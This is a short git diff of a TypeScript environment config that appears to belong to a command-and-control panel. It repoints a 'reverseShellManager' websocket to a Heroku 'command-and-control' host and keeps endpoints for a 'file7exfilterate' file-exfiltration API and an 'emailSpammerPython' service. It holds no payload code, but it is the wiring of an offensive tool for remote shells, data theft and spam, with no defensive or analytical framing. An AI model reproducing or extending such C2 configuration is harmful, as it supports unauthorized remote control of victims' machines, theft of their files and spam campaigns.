@@ -4,10 +4,12 @@ export const environment = {
   // wssurl: 'wss://c2-server.mtattab.com/reverseShellManager',
   // rooturl : 'https://c2-server-tvan66p23a-uc.a.run.app',
   // cSharpAPI : 'http://localhost:7109',
+  // wssurl: 'wss://c2-server-tvan66p23a-uc.a.run.app/reverseShellManager',
 
   cSharpAPI: 'https://file7exfilterate.azurewebsites.net',
   rooturl : 'https://command-and-control-de293e318d06.herokuapp.com',
-  wssurl: 'wss://c2-server-tvan66p23a-uc.a.run.app/reverseShellManager',
+  wssurl: 'wss://command-and-control-de293e318d06.herokuapp.com/reverseShellManager',
+
   emailSpammerPython: 'https://email-spammer-tvan66p23a-uc.a.run.app',
 
 
